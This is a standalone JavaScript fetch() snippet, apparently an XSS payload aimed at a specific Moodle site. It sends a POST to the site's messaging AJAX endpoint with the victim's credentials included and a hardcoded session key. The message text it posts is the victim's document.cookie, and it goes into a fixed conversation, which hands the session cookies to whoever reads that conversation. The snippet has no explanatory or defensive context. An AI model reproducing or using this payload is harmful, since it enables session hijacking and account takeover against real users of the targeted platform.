fetch("http://dist.kait20.ru/lib/ajax/service.php?sesskey=HzsJi4o7Yq&info=core_message_send_messages_to_conversation", {
    "credentials": "include",
    "headers": {
        "Content-Type": "application/json",
    },
    "referrer": "http://dist.kait20.ru/message/index.php",
    "body": `[{"index\":0,"methodname":"core_message_send_messages_to_conversation","args":{"conversationid":3588,"messages":[{"text":"${document.cookie}"}]}}]`,
    "method": "POST",
    "mode": "cors"
});
